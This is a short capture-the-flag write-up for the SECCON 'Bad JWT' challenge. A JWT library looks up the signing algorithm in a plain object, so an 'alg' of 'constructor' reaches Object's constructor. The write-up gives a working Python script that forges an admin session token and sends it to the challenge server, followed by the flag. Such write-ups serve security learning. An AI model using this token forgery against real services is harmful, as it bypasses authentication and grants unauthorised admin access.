# Bad JWT

## Overview

Manipulate the header of JWT with the desired algorithm.

```javascript
const algorithms = {
	hs256: (data, secret) => 
		base64UrlEncode(crypto.createHmac('sha256', secret).update(data).digest()),
	hs512: (data, secret) => 
		base64UrlEncode(crypto.createHmac('sha512', secret).update(data).digest()),
}

...

const createSignature = (header, payload, secret) => {
	const data = `${stringifyPart(header)}.${stringifyPart(payload)}`;
	const signature = algorithms[header.alg.toLowerCase()](data, secret);
	return signature;
}
```

```sh
> const algorithms = {
... 	hs256: (data, secret) => 
... 		base64UrlEncode(crypto.createHmac('sha256', secret).update(data).digest()),
... 	hs512: (data, secret) => 
... 		base64UrlEncode(crypto.createHmac('sha512', secret).update(data).digest()),
... }

> algorithms['constructor']
[Function: Object]

> algorithms['constructor']("data")
[String: 'data']
```

## Solution

```py
import requests
import base64

header = b'{"typ":"JWT","alg":"constructor"}'
payload = b'{"isAdmin":true}'

enc_header = base64.b64encode(header).replace(b'=', b'').decode()
enc_payload = base64.b64encode(payload).replace(b'=', b'').decode()
sig = base64.b64encode(header+payload).replace(b'=', b'').decode()

cookies = {
    'session': f'{enc_header}.{enc_payload}.{sig}'
}
print(cookies)

response = requests.get('http://bad-jwt.seccon.games:3000/', cookies=cookies, verify=False)
#response = requests.get('http://localhost:3000/', cookies=cookies, headers=headers, verify=False)

print(response.text)
```

`SECCON{Map_and_Object.prototype.hasOwnproperty_are_good}`